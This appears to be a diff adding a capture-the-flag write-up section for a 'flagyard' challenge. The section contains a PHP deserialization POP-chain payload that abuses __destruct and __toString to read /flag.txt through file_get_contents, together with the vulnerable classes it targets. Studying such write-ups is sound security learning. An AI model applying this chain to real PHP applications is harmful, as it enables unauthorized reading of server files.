@@ -169,6 +169,70 @@ echo base64_encode(serialize($pizza));
 
 ?>
 ```
+--------------
+
+### Pwned Bobby on flagyard
+
+---------------
+
+- Pop Chain-:
+
+```php
+<?php
+class ChessGame {
+    public $position = "/flag.txt";
+}
+
+class PositionAnalyzer {
+    public $gameRecord = "swissfish";
+    public $currentPosition;   
+} 
+
+$chess = new ChessGame;
+$analyzePosition = new PositionAnalyzer;
+$analyzePosition->currentPosition = $chess;
+
+echo base64_encode(serialize($analyzePosition));
+```
+
+- Class `ChessGame` magic method "__toString" read files with `file_get_contents`-:
+
+```php
+class ChessGame {
+    public $position;
+    
+    public function __construct($position) {
+        $this->position = $position;
+    }
+
+    public function __toString() {
+        return file_get_contents($this->position);
+    }
+}
+```
+
+- `__toString()` can only get triggered if it is treated as a string which brings us to class `PositonAnalyzer` which treats attributes `position` as a string, that is the point that we will pass `ChessGame` to.Also, it is being passed to `__destruct` which is executed after an object has been destroyed.That's our trigger point.
+
+```php
+class PositionAnalyzer {
+    public $gameRecord;
+    public $currentPosition;
+    
+    public function __construct($record) {
+        $this->gameRecord = $record;
+    }
+
+    public function validateMove($position) {
+        $this->currentPosition = $position;
+    }
+
+    public function __destruct() {
+        if ($this->currentPosition) {
+            echo $this->currentPosition;
+        }
+    }
+}
+```
 
 ---------------
 
